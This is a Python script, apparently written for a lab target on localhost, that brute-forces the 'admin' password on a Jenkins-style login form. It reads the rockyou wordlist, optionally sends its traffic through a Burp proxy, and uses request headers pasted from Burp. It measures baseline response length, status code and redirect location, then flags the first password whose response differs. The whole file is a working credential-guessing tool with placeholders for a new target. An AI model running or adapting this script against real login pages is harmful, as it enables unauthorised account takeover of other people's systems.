import requests

# username to target goes here:
username = "admin"

# path to password list goes here:
path_to_password_list = "/usr/share/wordlists/rockyou.txt"

# set whether you want the proxy to be used or not:
proxy = False

# proxy settings here:
http_proxy = "http://127.0.0.1:8080"
https_proxy = "https://127.0.0.1:8080"

proxies = {
    "http": http_proxy,
    "https": https_proxy
}

# read in a password list file and create a list from these:
with open(path_to_password_list, 'r') as file:
    payloadList = file.read().splitlines()

sampleData = ["ydgwj", "87234yrwhe", "9438r3jkhfgh4r", "87y4rfghfgh3iu4r", "934r3rkjhisdkfjh", "sdjfhsfhi",
              "234y7ru34khrkjh", username]

print("[i] Username: " + username)
print("[i] Password list: " + path_to_password_list)
print("\n")

init_response_lengths = []
init_response_statusCodes = []
init_response_locations = []

print("[i] Running init loop to get some sample data about the login responses\n")

password = "3847yrikwehrkwjh"

check_location = False

# the initialization loop:
for testusername in sampleData:
    # paste burp0_url, burp0_headers and burp0_data here:
    # replace username and password with variables testusername and password
    burp0_url = "http://127.0.0.1:9080/j_acegi_security_check"
    burp0_cookies = {"JSESSIONID.06b898ae": "node0do08h9p1n5u446x64ay8ppf04.node0"}
    burp0_headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"130\"",
                     "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Linux\"", "Accept-Language": "en-GB,en;q=0.9",
                     "Origin": "http://127.0.0.1:9080", "Content-Type": "application/x-www-form-urlencoded",
                     "Upgrade-Insecure-Requests": "1",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                     "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                     "Sec-Fetch-Dest": "document", "Referer": "http://127.0.0.1:9080/login?from=%2F",
                     "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    burp0_data = {"j_username": testusername, "j_password": password, "from": "/", "Submit": "Sign in"}

    if proxy:
        res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, cookies=burp0_cookies, proxies=proxies,
                            verify=False, allow_redirects=False)
    else:
        res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, cookies=burp0_cookies, verify=False,
                            allow_redirects=False)

    if res.headers["location"] != "":
        check_location = True
        init_response_location = len(res.headers["location"])
        init_response_location_value = res.headers["location"]
        init_response_locations.append(init_response_location)
    init_response_length = str(len(res.content))
    init_response_statusCode = str(res.status_code)

    init_result = "Length: " + init_response_length + " Status: " + init_response_statusCode  # + " Location: " + init_response_location
    init_response_lengths.append(init_response_length)
    init_response_statusCodes.append(init_response_statusCode)
    print(init_result)

print("\n")
init_max_lengths = max(init_response_lengths)
init_min_lengths = min(init_response_lengths)
init_length_variance = int(init_max_lengths) - int(init_min_lengths)

init_max_status_code = max(init_response_statusCodes)
init_min_status_code = min(init_response_statusCodes)
init_status_variance = int(init_max_status_code) - int(init_min_status_code)

init_max_locations = max(init_response_locations)
init_min_locations = min(init_response_locations)
init_locations_variance = int(init_max_locations) - int(init_min_locations)

if init_length_variance == 0:
    print("[i] No length variance found")
    print("[i]      Response length: " + init_response_length)
else:
    print("[i] Length variance detected: " + str(init_length_variance))

if init_status_variance == 0:
    print("[i] No status variance found")
    print("[i]      Status code: " + init_response_statusCode)
else:
    print("[i] Status code variance detected: " + str(init_status_variance))

if check_location:
    if init_locations_variance == 0:
        print("[i] No location variance found")
        print("[i]      Location: " + init_response_location_value)
    else:
        print("[i] Status code variance detected: " + str(init_status_variance))
        print("[i]      Location: " + init_response_location_value)

print("\n")

count = len(payloadList)
loopCounter = 0

print("[i] Starting login brute force with " + str(count) + " passwords.")

results = []
# the main loop:
for password in payloadList:
    # paste burp0_data here:
    # replace username and password with variables username and password
    burp0_data = {"j_username": username, "j_password": password, "from": "/", "Submit": "Sign in"}

    if proxy:
        res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, cookies=burp0_cookies, proxies=proxies,
                            verify=False, allow_redirects=False)
    else:
        res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, cookies=burp0_cookies, verify=False,
                            allow_redirects=False)

    response_length = str(len(res.content))
    response_statusCode = str(res.status_code)
    if check_location:
        response_location_value = res.headers["location"]
        result = "[!] Length: " + response_length + " Status: " + response_statusCode + " Location: " + response_location_value + " Password: " + password
    else:
        result = "[!] Length: " + response_length + " Status: " + response_statusCode + " Password: " + password

    if response_length != init_response_length:
        print(result)
        break
    if response_statusCode != init_response_statusCode:
        print(result)
        break
    if check_location:
        response_location_value = res.headers["location"]
        if response_location_value != init_response_location_value:
            print(result)
            break
    loopCounter += 1
    if (loopCounter % 100) == 0:
        print("[i] Count: " + str(loopCounter) + " of " + str(count))
